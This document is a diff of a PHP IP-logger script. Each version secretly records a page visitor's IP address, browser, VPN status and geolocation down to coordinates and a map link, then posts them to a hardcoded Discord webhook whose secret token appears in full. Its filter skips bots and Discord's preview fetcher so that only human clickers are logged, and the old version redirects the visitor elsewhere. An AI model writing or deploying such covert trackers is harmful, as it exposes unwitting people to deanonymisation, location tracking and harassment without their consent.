@@ -1,53 +1,116 @@
 <?php
 
-//Get the IP & Info
-$IP       = $_SERVER['REMOTE_ADDR'];
-$Browser  = $_SERVER['HTTP_USER_AGENT'];
+/* 
+Please keep this copyright statement intact
+Creator: Jeroenimo02#2380
+Publish Date: 19-03-2021
+Last Update: 07-01-2022
+APIs Provided By: geoiplookup.io and ip-api.com
+*/ 
 
-//Stop us from picking up bot ips
-if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
+//Get the visitor's IP
+$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
+$Browser = $_SERVER['HTTP_USER_AGENT'];
+
+//Stop the bots from logging
+if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
     exit();
 }
 
-//Info
-$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
-curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
-$Info = json_decode(curl_exec($Curl)); 
-curl_close($Curl);
+//YOU CAN SET YOUR TIMEZONE HERE!
+date_default_timezone_set("Europe/London");
+$Date = date('d/m/Y');
+$Time = date('G:i:s');
 
-$ISP = $Info->isp;
-$Country = $Info->country;
-$Region = $Info->regionName;
-$City = $Info->city;
-$COORD = "$Info->lat, $Info->lon"; // Coordinates
-
-//Variables
-$Webhook    = "https://discord.com/api/webhooks/931836372698939443/xJQX6Q66ccPOpr2TpdP59cxDcOGTuz4ugOYNy7Oo9wsXb1fzcerliJS3NggrYsr84b1-"; //Webhook here.
-
-$WebhookTag = "logger"; //This will be the name of the webhook when it sends a message.  
-
-//JS we are going to send to the webhook.
-$JS = array(
-    'username'   => "$WebhookTag - IP Logger" , 
-    'avatar_url' => "https://vgy.me/GQe9bJ.png",
-    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
-);
- 
-//Encode that JS so we can post it to the webhook
-$JSON = json_encode($JS);
-
-
-function IpToWebhook($Hook, $Content)
-{
-    //Use Curl to post to the webhook.
-      $Curl = curl_init($Hook);
-      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
-      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
-      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
-      curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-      return curl_exec($Curl);
+//Check if IP is a VPN (Is not always correct!)
+$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
+$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
+if ($VPNConn->connection_type === "Corporate") {
+    $VPN = "Yes";
+} else {
+    $VPN = "No";
 }
 
-IpToWebhook($Webhook, $JSON);
-header("Location: https://www.littest.site");
+//Set some variables
+$Country = $Details->country;
+$CountryCode = $Details->countryCode;
+$Region = $Details->regionName;
+$City = $Details->city;
+$Zip = $Details->zip;
+$Lat = $Details->lat;
+$Lon = $Details->lon;
+$WebhookName = $IP;
+//Old method of getting a flag picture
+//$Flag = "https://www.countryflags.io/{$Details->countryCode}/flat/64.png";
+$Details->countryCode = strtolower($Details->countryCode);
+$Flag = "https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country-4x3/{$Details->countryCode}.png";
+
+
+class Discord
+{
+
+	//This will run and send as soon as the page loads
+    public function Visitor()
+    {
+        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
+
+		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
+        $Webhook = "https://discord.com/api/webhooks/931836372698939443/xJQX6Q66ccPOpr2TpdP59cxDcOGTuz4ugOYNy7Oo9wsXb1fzcerliJS3NggrYsr84b1-";
+
+        $InfoArr = array(
+            "username" => "$WebhookName",
+            "avatar_url" => "$Flag",
+            "embeds" => [array(
+
+                "title" => "Visitor From $Country",
+                "color" => "39423",
+
+                "fields" => [array(
+                    "name" => "IP",
+                    "value" => "$IP",
+                    "inline" => true
+                ),
+                    array(
+                        "name" => "VPN?",
+                        "value" => "$VPN",
+                        "inline" => true
+                    ),
+                    array(
+                        "name" => "Useragent",
+                        "value" => "$Browser"
+                    ),
+                    array(
+                        "name" => "Country/CountryCode",
+                        "value" => "$Country/$CountryCode",
+                        "inline" => true
+                    ),
+                    array(
+                        "name" => "Region | City | Zip",
+                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
+                        "inline" => true
+                    )],
+
+                "footer" => array(
+                    "text" => "$Date $Time",
+					//Alarm-clock icon for the footer. You could also download the image and set the icon_url to the image path
+                    "icon_url" => "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
+                ),
+            )],
+        );
+
+		//Some code that sends the info as an embed to Discord
+        $JSON = json_encode($InfoArr);
+
+        $Curl = curl_init($Webhook);
+        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
+        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+		
+		//En voilà
+        return curl_exec($Curl);
+
+    }
+}
+
 ?>
